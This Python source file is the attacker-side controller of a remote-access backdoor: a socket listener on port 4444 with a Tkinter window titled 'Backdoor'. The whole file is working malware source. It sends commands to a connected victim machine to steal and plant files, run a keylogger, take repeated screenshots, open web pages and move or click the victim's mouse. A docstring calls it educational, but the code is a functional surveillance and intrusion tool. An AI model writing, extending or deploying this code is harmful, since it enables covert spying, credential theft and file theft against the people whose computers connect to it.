import socket
import json
import base64
import threading
import time
from contextlib import redirect_stdout
from tkinter import Tk, Button, Text, END, Entry, Toplevel


class TextWrapper:
    """It was necessary to draw the windows into which the text was inserted"""
    def __init__(self, text_field=Text):
        self.text_field = text_field

    def write(self, text: str):
        self.text_field.insert(END, text)

    def flush(self):
        self.text_field.update()


class Listener:

    """
    It runs on the hacker's computer. Start the process and wait for the victim to connect to your port.
    I repeat, all this was created solely for educational purposes. And there was never any intention to hack someone!
    """

    def __init__(self, ip, port):
        count = 0
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        listener.listen(0)
        print('Waiting for incoming connections')
        self.connection, address = listener.accept()
        print("[+] Get a connection from " + str(address))

    def reliable_send(self, data):

        """To send data (commands) to another computer."""

        json_data = json.dumps(data).encode('utf-8')
        self.connection.send(json_data)

    def reliable_receive(self):

        """To receive data (response) from another computer."""

        json_data = ""
        json_data_all = ""
        while True:
            try:
                json_data = self.connection.recv(1024)
                json_data = json_data.decode('utf-8', "replace")
                json_data_all += json_data
                return json.loads(json_data_all)
            except ValueError:
                continue

    def execute_remotely(self, command):
        self.reliable_send(command)
        if command[0] == 'exit':
            self.connection.close()
            exit()
        return self.reliable_receive()

    def write_file(self, path, content):

        """To write data to a file."""

        with open(path, "wb") as file:
            content = base64.b64decode(content)
            file.write(content)
            return "[+] Download successful"

    def read_file(self, path):

        """"To upload data to a file."""

        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    def run_connection(self, command):

        """The main process for checking the correct commands."""

        command = command.split()
        try:
            if command[0] == "upload":
                file_content = self.read_file(command[1])
                file_content = file_content.decode("utf8", "replace")
                command.append(file_content)
            result = self.execute_remotely(command)
            if command[0] == "download" and "Error, try" not in result:
                result = self.write_file(command[1], result)
            if command[0] == "screenloger":
                self.write_file("scrennshoot.png", result)
                result = "[+] Take screenshot successful"
        except Exception:
            result = "Error during command execution"
        if command[0] not in ["left", "right", "up","down","screenloger","click"]:
            root = Toplevel()
            root.title("".join(command))
            if command[0] in ["upload", "download", "keyloger", "screenshot"]:
                root.geometry("200x100")
            else:
                root.geometry("600x400")
            text = Text(root)
            text.pack()
            textwr = TextWrapper(text)
            with redirect_stdout(textwr):  # подменяем объект sys.stdout на свой объект
                print(result)

    def run_app(self):

        """Launching the graphical menu and button binds."""

        def sent_result_decor(func):
            def sent_res(*args):
                command = func()
                name.delete(0, END)
                if command:
                    self.run_connection(command)
                else:
                    pass
            return sent_res

        @sent_result_decor
        def get_entry():
            return name.get()
            # sent_result(command)

        def screenshot_taken(event):
            command = "screenloger"
            even = event
            if even.is_set():
                even.clear()
            else:
                even.set()

                def screenloger(command):
                    while True:
                        even.wait()
                        self.run_connection(command)
                        time.sleep(1)

                th2 = threading.Thread(target=screenloger, args=(command,), daemon=True)
                th2.start()

        @sent_result_decor
        def download_file():
            return "download " + name.get()

        @sent_result_decor
        def open_web():
            return "web " + name.get()

        @sent_result_decor
        def upload_file():
            return "upload " + name.get()

        @sent_result_decor
        def start_keylog():
            return "keyloger"

        """MOUSE"""

        @sent_result_decor
        def move_click(*args):
            return "click"

        @sent_result_decor
        def move_right(*args):
            return "right"

        @sent_result_decor
        def move_left(*args):
            return "left"

        @sent_result_decor
        def move_up(*args):
            return "up"

        @sent_result_decor
        def move_down(*args):
            return "down"

        """MOUSE"""

        def exit_app():
            self.execute_remotely(["exit",])

        event = threading.Event()
        window = Tk()
        window.title("Backdoor")
        window.geometry("550x250")
        name = Entry(window)
        window.bind("<Return>", get_entry)
        window.bind("<Left>", move_left)
        window.bind("<Right>", move_right)
        window.bind("<Up>", move_up)
        window.bind("<Down>", move_down)
        name.grid(row=0, column=3)
        Button(window, text="Enter", command=get_entry).grid(row=0, column=4)
        Button(window, text="Exit", command=exit_app).grid(row=2, column=5)
        Button(window, text="Download", command=download_file).grid(row=2, column=1)
        Button(window, text="Upload", command=upload_file).grid(row=2, column=2)
        Button(window, text="Keyloger", command=start_keylog).grid(row=2, column=4)
        Button(window, text="Web", command=open_web).grid(row=2, column=6)
        Button(window, text="Screenloger", command=lambda: screenshot_taken(event)).grid(row=2, column=3)
        Button(window, text="→", command=move_right).grid(row=4, column=5)
        Button(window, text="←", command=move_left).grid(row=4, column=3)
        Button(window, text="↑", command=move_up).grid(row=3, column=4)
        Button(window, text="CLICK", command=move_click).grid(row=4, column=4)
        Button(window, text="↓", command=move_down).grid(row=5, column=4)
        window.mainloop()

    def start(self):
        self.run_app()


"""Creating an object based on our class."""
if __name__ == "__main__":
    my_listener = Listener("192.168.0.104", 4444)  #Enter the ip address and any port.
    my_listener.start()